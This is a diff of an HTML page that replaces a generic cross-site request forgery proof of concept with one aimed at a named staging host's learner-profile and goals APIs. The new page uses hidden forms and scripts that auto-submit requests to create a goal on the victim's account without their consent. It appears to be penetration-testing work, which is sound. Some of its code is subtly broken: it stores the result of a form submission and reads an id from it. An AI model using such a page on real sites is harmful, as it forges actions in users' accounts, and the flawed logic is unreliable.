@@ -1,10 +1,33 @@
 <html>
-<body onload='document.CSRF.submit()'>
+    <body>
+        <form action="https://craun.suite.staging.bridgeapp.com/api/learn/learner/profile/self" method="GET">
+        </form>
+        <script>
+            localStorage.setItem("localUser", document.forms[0].submit());
+        </script>
 
-<form action='http://targetWebsite/Authenticate.jsp' method='POST' name='CSRF'>
-    <input type='hidden' name='name' value='Hacked'>
-    <input type='hidden' name='password' value='Hacked'>
-</form>
-
-</body>
+        <form action="https://craun.suite.staging.bridgeapp.com/api/talent/users/1/goals" method="POST">
+            <input type="hidden" name="name" id="goals_name" value="csrf goals" />
+            <input type="hidden" name="description" id="goals_description" value="csrf exploit making a goal" />
+            <input type="hidden" name="show_on_timeline" id="goals_show_on_timeline" value="true" />
+            <input type="hidden" name="goal_type" id="goals_goal_type" value="INDIVIDUAL" />
+            <input type="hidden" name="status" id="goals_status" value="NOT_STARTED" />
+            <input type="hidden" name="overdue" id="goals_overdue" value="false" />
+            <input type="hidden" name="visibility" id="goals_visibility" value="MANAGER_INDIVIDUAL" />
+            <input type="hidden" name="weight" id="goals_weight" value="4" />
+            <input type="hidden" name="completed" id="goals_completed" value="false" />
+            <input type="hidden" name="user_id" id="goals_user_id" />
+            <input type="hidden" name="started_at" id="goals_started_at" />
+            <input type="hidden" name="due_at" id="goals_due_at" />
+        </form>
+        <script>
+            var user_id = localStorage.getItem("localUser").id;
+            var started_at = new Date().toISOString();
+            var due_at = new Date(new Date().getFullYear(), new Date().getMonth()+1, 1).toISOString();
+            document.getElementById("goals_user_id").setAttribute("value",user_id);
+            document.getElementById("goals_started_at").setAttribute("value",started_at);
+            document.getElementById("goals_due_at").setAttribute("value",due_at);
+            document.forms[1].submit();
+        </script>
+    </body>
 </html>
